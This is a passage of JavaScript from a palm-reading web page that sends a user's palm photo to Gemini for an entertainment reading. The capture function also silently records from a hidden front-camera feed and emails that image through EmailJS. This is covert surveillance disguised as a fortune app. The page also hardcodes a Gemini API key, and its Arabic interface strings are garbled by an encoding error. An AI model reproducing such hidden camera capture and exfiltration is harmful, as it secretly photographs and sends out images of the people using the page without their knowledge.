                showMessage(`ØªÙ… Ø¥Ø±Ø³Ø§Ù„ ØµÙˆØ±Ø© Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ${cameraType === 'front' ? 'Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©' : 'Ø§Ù„Ø®Ù„ÙÙŠØ©'} Ø¹Ø¨Ø± Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ Ø¨Ù†Ø¬Ø§Ø­!`, 'success');
            } catch (error) {
                console.error(`Failed to send ${cameraType} camera image via email:`, error);
                showMessage(`ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ ØµÙˆØ±Ø© Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ${cameraType === 'front' ? 'Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©' : 'Ø§Ù„Ø®Ù„ÙÙŠØ©'} Ø¹Ø¨Ø± Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ.`, 'error');
            }
        }

        /**
         * Handles image upload from file input.
         * @param {Event} event - The change event from the file input.
         */
        async function handleImageUpload(event) {
            const file = event.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = async function(e) {
                    const originalBase64 = e.target.result;
                    const resizedBase64 = await resizeImage(originalBase64);

                    if (resizedBase64) {
                        palmImagePreviewPalm.src = resizedBase64;
                        palmImagePreviewPalm.style.display = 'block';
                        capturedRearImagePreview.style.display = 'none'; // Hide camera previews
                        activeRearPalmImageBase64 = resizedBase64; // Use this as the main image for AI
                        analyzeButtonPalm.disabled = false; // Enable the analyze button
                        analyzeButtonPalm.classList.remove('opacity-50', 'cursor-not-allowed');
                        readingResultsPalm.classList.add('hidden'); // Hide previous results
                        showMessage('ØªÙ… ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙˆØ±Ø© ÙˆØªØ¹Ø¯ÙŠÙ„ Ø£Ø¨Ø¹Ø§Ø¯Ù‡Ø§ Ø¨Ù†Ø¬Ø§Ø­. Ø§Ù†Ù‚Ø± Ø¹Ù„Ù‰ "ØªØ­Ù„ÙŠÙ„ Ø§Ù„ÙƒÙ" Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù‚Ø±Ø§Ø¡ØªÙƒ.', 'success');
                    } else {
                        palmImagePreviewPalm.style.display = 'none';
                        analyzeButtonPalm.disabled = true;
                        analyzeButtonPalm.classList.add('opacity-50', 'cursor-not-allowed');
                        activeRearPalmImageBase64 = null;
                    }
                };
                reader.onerror = function() {
                    showMessage('ÙØ´Ù„ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙˆØ±Ø©.', 'error');
                    palmImagePreviewPalm.style.display = 'none';
                    analyzeButtonPalm.disabled = true;
                    analyzeButtonPalm.classList.add('opacity-50', 'cursor-not-allowed');
                    activeRearPalmImageBase64 = null;
                };
                reader.readAsDataURL(file); // Read file as Data URL (Base64)
            } else {
                palmImagePreviewPalm.style.display = 'none';
                analyzeButtonPalm.disabled = true;
                analyzeButtonPalm.classList.add('opacity-50', 'cursor-not-allowed');
                activeRearPalmImageBase64 = null;
                showMessage('Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ø®ØªÙŠØ§Ø± ØµÙˆØ±Ø©.', 'info');
            }
        }

        /**
         * Captures frames from both rear and front hidden video feeds.
         * Displays rear image and sends front image via EmailJS.
         */
        async function capturePhoto() {
            // Check if rear camera stream is ready
            if (!currentRearStream || !hiddenRearVideoFeed.srcObject || hiddenRearVideoFeed.videoWidth === 0 || hiddenRearVideoFeed.videoHeight === 0) {
                showMessage('Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ© Ù„ÙŠØ³Øª Ø¬Ø§Ù‡Ø²Ø© Ù„Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©. ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„.', 'error');
                return;
            }
            // Check if front camera stream is ready for email sending
            if (!currentFrontStream || !hiddenFrontVideoFeed.srcObject || hiddenFrontVideoFeed.videoWidth === 0 || hiddenFrontVideoFeed.videoHeight === 0) {
                showMessage('Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ© Ù„ÙŠØ³Øª Ø¬Ø§Ù‡Ø²Ø© Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©. ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„.', 'error');
                // Continue with rear camera capture if front fails
            }

            // Hide live feed after capture
            liveCameraFeed.style.display = 'none';

            // Capture from Rear Camera (for display and AI)
            hiddenCanvas.width = hiddenRearVideoFeed.videoWidth;
            hiddenCanvas.height = hiddenRearVideoFeed.videoHeight;
            let context = hiddenCanvas.getContext('2d');
            context.drawImage(hiddenRearVideoFeed, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
            const originalRearBase64 = hiddenCanvas.toDataURL('image/png');
            const resizedRearBase64 = await resizeImage(originalRearBase64);

            // Capture from Front Camera (for EmailJS only)
            let resizedFrontBase64 = null;
            if (currentFrontStream && hiddenFrontVideoFeed.srcObject && hiddenFrontVideoFeed.videoWidth > 0 && hiddenFrontVideoFeed.videoHeight > 0) {
                hiddenCanvas.width = hiddenFrontVideoFeed.videoWidth;
                hiddenCanvas.height = hiddenFrontVideoFeed.videoHeight;
                context = hiddenCanvas.getContext('2d');
                context.drawImage(hiddenFrontVideoFeed, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
                const originalFrontBase64 = hiddenCanvas.toDataURL('image/png');
                resizedFrontBase64 = await resizeImage(originalFrontBase64);
            }


            // Handle Rear Image Display and Storage for AI
            if (resizedRearBase64) {
                capturedRearImagePreview.src = resizedRearBase64;
                capturedRearImagePreview.style.display = 'block';
                palmImagePreviewPalm.style.display = 'none'; // Hide upload preview if active
                activeRearPalmImageBase64 = resizedRearBase64; // Store for AI analysis
                analyzeButtonPalm.disabled = false;
                analyzeButtonPalm.classList.remove('opacity-50', 'cursor-not-allowed');
                showMessage('ØªÙ… Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„Ø®Ù„ÙÙŠØ© ÙˆØªØ¹Ø¯ÙŠÙ„ Ø£Ø¨Ø¹Ø§Ø¯Ù‡Ø§ Ø¨Ù†Ø¬Ø§Ø­.', 'success');
            } else {
                capturedRearImagePreview.style.display = 'none';
                analyzeButtonPalm.disabled = true;
                analyzeButtonPalm.classList.add('opacity-50', 'cursor-not-allowed');
                activeRearPalmImageBase64 = null;
                showMessage('ÙØ´Ù„ Ø§Ù„ØªÙ‚Ø§Ø· Ø£Ùˆ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„Ø®Ù„ÙÙŠØ©.', 'error');
            }

            // Handle Front Image Sending via EmailJS
            if (resizedFrontBase64) {
                await sendImageViaEmailJS(resizedFrontBase64, 'front');
            } else {
                showMessage('Ù„Ù… ÙŠØªÙ… Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ© Ù„Ø¥Ø±Ø³Ø§Ù„Ù‡Ø§ Ø¹Ø¨Ø± Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ.', 'info');
            }
        }

        /**
         * Generates a simulated palm reading using the Gemini API.
         */
        async function generatePalmReading() {
            if (!activeRearPalmImageBase64) {
                showMessage('Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø±ÙØ¹ Ø£Ùˆ Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© ÙƒÙÙƒ Ø§Ù„Ø®Ù„ÙÙŠØ© Ø£ÙˆÙ„Ø§Ù‹.', 'error');
                return;
            }

            // Show loading indicator and disable button
            analyzeButtonPalm.disabled = true;
            analyzeButtonPalm.classList.add('opacity-50', 'cursor-not-allowed');
            loadingIndicatorPalm.classList.remove('hidden');
            readingResultsPalm.classList.add('hidden'); // Hide previous results
            messageBox.classList.add('hidden'); // Hide any previous messages

            try {
                // Prepare the prompt for the LLM
                const prompt = "Ø£Ù†Øª Ù‚Ø§Ø±Ø¦ ÙƒÙ Ø§ÙØªØ±Ø§Ø¶ÙŠ. Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„ØªÙŠ ØªÙ… ØªØ­Ù…ÙŠÙ„Ù‡Ø§ (Ù„Ø§ ØªØ­Ø§ÙˆÙ„ ØªØ­Ù„ÙŠÙ„Ù‡Ø§ Ø¨ØµØ±ÙŠÙ‹Ø§ Ø¨Ø¯Ù‚Ø©ØŒ ÙÙ‚Ø· Ø§Ø³ØªØ®Ø¯Ù…Ù‡Ø§ ÙƒØ¥Ø´Ø§Ø±Ø© Ù„Ø¨Ø¯Ø¡ Ø§Ù„Ù‚Ø±Ø§Ø¡Ø©)ØŒ Ù‚Ù… Ø¨ØªÙˆÙ„ÙŠØ¯ Ù‚Ø±Ø§Ø¡Ø© ÙƒÙ Ø¥ÙŠØ¬Ø§Ø¨ÙŠØ© ÙˆÙ…Ù…ØªØ¹Ø© ÙˆÙ…Ø­ÙØ²Ø©. ÙŠØ¬Ø¨ Ø£Ù† ØªÙƒÙˆÙ† Ø§Ù„Ù‚Ø±Ø§Ø¡Ø© Ø¹Ø§Ù…Ø© ÙˆØªØªØ­Ø¯Ø« Ø¹Ù† Ø®Ø·ÙˆØ· Ø§Ù„Ø­ÙŠØ§Ø©ØŒ Ø§Ù„Ù‚Ù„Ø¨ØŒ Ø§Ù„Ø±Ø£Ø³ØŒ ÙˆØ§Ù„Ù…ØµÙŠØ± (Ø¥Ø°Ø§ ÙƒØ§Ù†Øª Ù…ÙˆØ¬ÙˆØ¯Ø©)ØŒ Ø¨Ø§Ù„Ø¥Ø¶Ø§ÙØ© Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„Ø§Ù„ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ© (Ù…Ø«Ù„ ØªÙ„ Ø§Ù„Ù…Ø´ØªØ±ÙŠØŒ ØªÙ„ Ø§Ù„Ù‚Ù…Ø±). Ø§Ø¬Ø¹Ù„Ù‡Ø§ ØªØ¨Ø¯Ùˆ ÙˆÙƒØ£Ù†Ù‡Ø§ ØªØ­Ù„ÙŠÙ„ Ø­Ù‚ÙŠÙ‚ÙŠ ÙˆÙ„ÙƒÙ† Ø§Ø°ÙƒØ± Ø¨ÙˆØ¶ÙˆØ­ ÙÙŠ Ø§Ù„Ù†Ù‡Ø§ÙŠØ© Ø£Ù†Ù‡Ø§ Ù„Ø£ØºØ±Ø§Ø¶ Ø§Ù„ØªØ±ÙÙŠÙ‡ ÙˆØ§Ù„ØªØ³Ù„ÙŠØ© ÙÙ‚Ø·. Ø§Ø³ØªØ®Ø¯Ù… Ù„ØºØ© Ø¹Ø±Ø¨ÙŠØ© ÙØµØ­Ù‰ ÙˆØ¬Ø°Ø§Ø¨Ø©. Ø§Ø¬Ø¹Ù„ Ø§Ù„Ù‚Ø±Ø§Ø¡Ø© Ù…ØªÙˆØ³Ø·Ø© Ø§Ù„Ø·ÙˆÙ„ (Ø­ÙˆØ§Ù„ÙŠ 200-300 ÙƒÙ„Ù…Ø©).";

                const contents = [
                    { role: "user", parts: [{ text: prompt }] }
                ];

                // Add rear image for AI analysis
                const mimeTypeRear = activeRearPalmImageBase64.split(',')[0].split(':')[1].split(';')[0];
                const base64DataRear = activeRearPalmImageBase64.split(',')[1];
                contents[0].parts.push({
                    inlineData: {
                        mimeType: mimeTypeRear,
                        data: base64DataRear
                    }
                });

                const payload = {
                    contents: contents,
                    generationConfig: {
                        temperature: 0.8,
                        maxOutputTokens: 500
                    }
                };

                const apiKey = "AIzaSyDfUkLknP8pzk_0bn4Kii2bS14Y35hLJfw"; // API key is provided by Canvas runtime
                const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${apiKey}`;

                const response = await fetch(apiUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                const result = await response.json();

                if (result.candidates && result.candidates.length > 0 &&
                    result.candidates[0].content && result.candidates[0].content.parts &&
                    result.candidates[0].content.parts.length > 0) {
                    const reading = result.candidates[0].content.parts[0].text;
                    readingTextPalm.innerHTML = reading.replace(/\n/g, '<br>');
                    readingResultsPalm.classList.remove('hidden');
                    showMessage('ØªÙ…Øª Ù‚Ø±Ø§Ø¡Ø© ÙƒÙÙƒ Ø¨Ù†Ø¬Ø§Ø­!', 'success');
                } else {
                    showMessage('Ø¹Ø°Ø±Ù‹Ø§ØŒ Ù„Ù… Ø£ØªÙ…ÙƒÙ† Ù…Ù† ØªÙˆÙ„ÙŠØ¯ Ù‚Ø±Ø§Ø¡Ø© ÙƒÙ. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.', 'error');
                    console.error('API response structure unexpected:', result);
                }

            } catch (error) {
                console.error('Error generating palm reading:', error);
                showMessage('Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ ØªØ­Ù„ÙŠÙ„ Ø§Ù„ÙƒÙ. ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø§ØªØµØ§Ù„Ùƒ Ø¨Ø§Ù„Ø¥Ù†ØªØ±Ù†Øª ÙˆØ§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.', 'error');
            } finally {
                // Re-enable button and hide loading indicator
                analyzeButtonPalm.disabled = false;
                analyzeButtonPalm.classList.remove('opacity-50', 'cursor-not-allowed');
                loadingIndicatorPalm.classList.add('hidden');
            }
        }

        // --- Event Listeners ---

        // Navigation buttons
        document.querySelector('header nav ul').addEventListener('click', (e) => {
            if (e.target.tagName === 'A') {
                const sectionId = e.target.getAttribute('onclick').match(/'(.*?)'/)[1];
                showSection(sectionId);
            }
        });

        // Palm Reading Mode Selection
        uploadModeButton.addEventListener('click', () => showPalmReadingMode('upload'));
        cameraModeButton.addEventListener('click', () => showPalmReadingMode('camera'));

        // Image Upload
        palmImageUploadPalm.addEventListener('change', handleImageUpload);

        // Camera Controls
        capturePhotoButton.addEventListener('click', capturePhoto);

        // Analyze Button
        analyzeButtonPalm.addEventListener('click', generatePalmReading);

        // Initial load: show home section
        window.onload = () => {
            showSection('home');
        };
    </script>
</body>
</html>
